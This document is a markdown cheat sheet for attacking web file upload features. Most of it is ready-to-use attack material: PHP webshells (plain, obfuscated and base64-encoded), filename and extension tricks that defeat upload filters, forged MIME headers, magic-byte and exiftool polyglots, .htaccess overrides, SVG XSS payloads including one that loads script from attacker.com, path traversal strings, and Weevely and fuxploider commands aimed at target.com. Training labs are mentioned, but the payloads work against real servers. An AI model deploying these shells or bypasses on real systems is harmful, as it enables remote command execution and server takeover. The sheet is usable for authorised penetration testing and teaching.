# File Upload Hints & Cheat Sheet

Quick reference for file upload testing, bypass techniques, and payloads.

---

## Quick Payloads

### Minimal PHP Webshells

```php
<?php system($_GET['c']); ?>
<?php passthru($_GET['c']); ?>
<?=`$_GET[c]`?>
```

### One-Liner Shells

```php
<?php if(isset($_REQUEST['c'])){echo "<pre>";$c=($_REQUEST['c']);system($c);echo "</pre>";die;} ?>
```

### Obfuscated Shell

```php
<?php $a='sys'.'tem';$a($_GET['c']); ?>
```

---

## File Extension Bypass

### PHP Alternatives

```
.php
.php3
.php4
.php5
.php7
.pht
.phtml
.phar
.phps
.pgif
.phtm
.inc
.module
```

### ASP/ASPX Alternatives

```
.asp
.aspx
.asa
.cer
.cdx
.ashx
.asmx
.ascx
.config
```

### JSP Alternatives

```
.jsp
.jspx
.jsw
.jsv
.jspf
```

### Other Extensions

```
.pl     (Perl)
.py     (Python)
.cgi
.rb     (Ruby)
.cfm    (ColdFusion)
.shtml  (SSI)
```

---

## Extension Manipulation Techniques

### Double Extensions

```
shell.php.jpg
shell.php.png
shell.php.gif
shell.jpg.php
shell.png.php
```

### Null Byte Injection (Legacy)

```
shell.php%00.jpg
shell.php%00.png
shell.php\x00.jpg
shell.php\0.jpg
```

### Case Manipulation

```
shell.pHp
shell.PhP
shell.PHP
shell.pHP
```

### Special Characters

```
shell.php.
shell.php..
shell.php....
shell.php;.jpg
shell.php:jpg
shell.php/
shell.php%20
shell%20.php
```

### URL Encoding

```
shell.php%2500.jpg        # Double encoded null
shell%2Ephp               # Encoded dot
shell.p%68p               # Encoded 'h'
```

---

## MIME Type Bypass

### Image MIME Types

```
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: image/bmp
Content-Type: image/svg+xml
```

### Document MIME Types

```
Content-Type: application/pdf
Content-Type: application/msword
Content-Type: text/plain
```

### Multipart Manipulation

```
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['c']); ?>
------WebKitFormBoundary--
```

---

## File Signature (Magic Bytes) Bypass

### Prepend Magic Bytes

```bash
# GIF header
echo -e 'GIF89a<?php system($_GET["c"]); ?>' > shell.php

# JPEG header
printf '\xFF\xD8\xFF\xE0<?php system($_GET["c"]); ?>' > shell.php

# PNG header
printf '\x89PNG\r\n\x1a\n<?php system($_GET["c"]); ?>' > shell.php

# PDF header
echo '%PDF-1.4<?php system($_GET["c"]); ?>' > shell.php
```

### Using Exiftool

```bash
# Embed in JPEG comment
exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg

# Embed in XMP data
exiftool -XMP-dc:Description='<?php system($_GET["c"]); ?>' image.jpg
```

### Common Magic Bytes

| File Type | Magic Bytes | Hex |
|-----------|-------------|-----|
| JPEG | `\xFF\xD8\xFF` | FF D8 FF |
| PNG | `\x89PNG\r\n\x1a\n` | 89 50 4E 47 0D 0A 1A 0A |
| GIF | `GIF87a` or `GIF89a` | 47 49 46 38 |
| PDF | `%PDF` | 25 50 44 46 |
| ZIP | `PK\x03\x04` | 50 4B 03 04 |
| RAR | `Rar!\x1a\x07` | 52 61 72 21 1A 07 |
| BMP | `BM` | 42 4D |

---

## .htaccess Upload

### Make Extensions Run as PHP

```apache
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png
AddType application/x-httpd-php .gif
```

### Handle All Files as PHP

```apache
SetHandler application/x-httpd-php
```

### Match Specific Files

```apache
<FilesMatch "shell">
    SetHandler application/x-httpd-php
</FilesMatch>
```

### Enable PHP in Directory

```apache
php_flag engine on
```

---

## Platform-Specific Payloads

### DVWA

```
# Low Security
shell.php (direct upload)

# Medium Security
Modify Content-Type: image/jpeg

# High Security
GIF89a<?php system($_GET['c']); ?>
Double extension: shell.php.jpg
```

### bWAPP

```
# Direct upload on low security
# Medium: Use double extension or MIME bypass
# High: Polyglot with magic bytes
```

### Juice Shop

```
# SVG for XSS
# PDF with JavaScript
# ZIP Slip for path traversal
```

### WebGoat

```
# JSP shells
# Follow exercise-specific requirements
```

---

## XSS via File Upload

### SVG Payload

```xml
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
</svg>
```

### SVG with External Script

```xml
<svg xmlns="http://www.w3.org/2000/svg">
<script href="http://attacker.com/evil.js"/>
</svg>
```

### HTML Payload

```html
<html><body><script>alert('XSS')</script></body></html>
```

---

## Polyglot File Creation

### GIF-PHP Polyglot

```bash
echo 'GIF89a<?php system($_GET["c"]); ?>' > shell.gif.php
```

### JPEG-PHP Polyglot

```bash
# Using real JPEG
exiftool -Comment='<?php system($_GET["c"]); ?>' real.jpg
mv real.jpg shell.php.jpg
```

### PNG-PHP Polyglot

```bash
# Append to valid PNG
cat valid.png > shell.php.png
echo '<?php system($_GET["c"]); ?>' >> shell.php.png
```

---

## Bypassing Content Filters

### String Concatenation

```php
<?php $a='sys'.'tem'; $a($_GET['c']); ?>
<?php $a='sy'; $b='stem'; ($a.$b)($_GET['c']); ?>
```

### Variable Functions

```php
<?php $_GET['a']($_GET['c']); ?>
// Call: ?a=system&c=id
```

### Base64 Payload (decoded at runtime)

```php
<?php $x=base64_decode('c3lzdGVt'); $x($_GET['c']); ?>
// 'c3lzdGVt' decodes to 'system'
```

### Alternative Functions

```php
<?php passthru($_GET['c']); ?>
<?php popen($_GET['c'],'r'); ?>
```

---

## Directory Traversal in Filename

### Path Traversal

```
../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
....//....//....//etc/passwd
..%252f..%252f..%252fetc%252fpasswd
```

### Filename with Path

```
Content-Disposition: form-data; name="file"; filename="../../../var/www/html/shell.php"
```

---

## Tools Reference

```bash
# Weevely - Generate obfuscated shell
weevely generate password shell.php
weevely http://target.com/uploads/shell.php password

# Exiftool - Embed payload in image
exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg

# Generate polyglot
cat real.gif shell.php > polyglot.gif.php

# Fuxploider - Automated file upload scanner
python fuxploider.py --url http://target.com/upload

# Upload scanner with Burp
# Use Intruder with extension wordlist
```

---

## Quick Reference Tables

### Bypass Technique Matrix

| Validation | Bypass Technique |
|------------|------------------|
| Extension blacklist | Alt extensions, double ext, null byte |
| Extension whitelist | Double extension, magic bytes |
| MIME type check | Forge Content-Type header |
| File signature check | Polyglot files, magic bytes |
| Content analysis | Obfuscation, alternative functions |
| Image processing | Race condition, ImageMagick exploits |

### Common Upload Paths

| Platform | Typical Upload Path |
|----------|---------------------|
| DVWA | /hackable/uploads/ |
| bWAPP | /images/ |
| WordPress | /wp-content/uploads/ |
| Drupal | /sites/default/files/ |
| Generic | /uploads/, /files/, /images/ |

---

## Troubleshooting

| Problem | Solution |
|---------|----------|
| File not running | Check if directory allows script handling |
| 403 Forbidden | Check .htaccess, try different location |
| Extension filtered | Try alternatives, case, double extension |
| MIME blocked | Forge Content-Type in Burp |
| Content filtered | Use obfuscation, polyglot |
| Can't find upload | Check response, look for path disclosure |

---

## OWASP References

- [OWASP Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)

## Additional Resources

- [PayloadsAllTheThings - Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
- [HackTricks - File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload)
- [PortSwigger File Upload](https://portswigger.net/web-security/file-upload)
